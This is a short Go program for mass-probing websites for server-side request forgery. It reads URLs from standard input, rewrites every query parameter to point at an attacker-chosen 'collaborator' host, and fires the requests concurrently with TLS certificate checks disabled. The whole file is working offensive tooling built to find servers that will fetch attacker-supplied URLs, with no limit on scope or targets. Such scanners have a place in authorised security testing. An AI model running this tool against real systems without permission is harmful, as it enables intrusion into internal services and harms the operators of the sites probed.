package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"os"
	"sync"
	"time"
)

var transport = &http.Transport{
	TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	DialContext: (&net.Dialer{
		Timeout:   30 * time.Second,
		KeepAlive: time.Second,
		DualStack: true,
	}).DialContext,
}

var httpClient = &http.Client{
	Transport: transport,
}

func main() {
	var collaborator string
	var threads int
	var wg sync.WaitGroup
	urls := make(chan string)
	flag.StringVar(&collaborator, "c", "", "Collaborator to use")
	flag.IntVar(&threads, "t", 20, "Specify threads")
	flag.Parse()

	if collaborator == "" {
		fmt.Println("Please specify the collaborator using -c")
		fmt.Println("Example: ./main.go -c https://mycollaborator.com")
		os.Exit(0)
	}

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go workers(urls, &wg, collaborator)
	}

	input := bufio.NewScanner(os.Stdin)
	for input.Scan() {
		urls <- input.Text()
	}
	close(urls)

	wg.Wait()
}

func checkssrf(link, collaborator string) {
	parse, _ := url.Parse(link)
	q := parse.Query()
	if len(q) == 0 {
		return
	}
	params := url.Values{}
	for a := range q {
		params.Add(a, collaborator)
	}
	final := parse.Scheme + "://" + parse.Host + parse.Path + "?" + params.Encode()
	httpClient.Get(final)
}

func workers(cha chan string, wg *sync.WaitGroup, collab string) {
	for i := range cha {
		checkssrf(i, collab)
	}
	wg.Done()
}
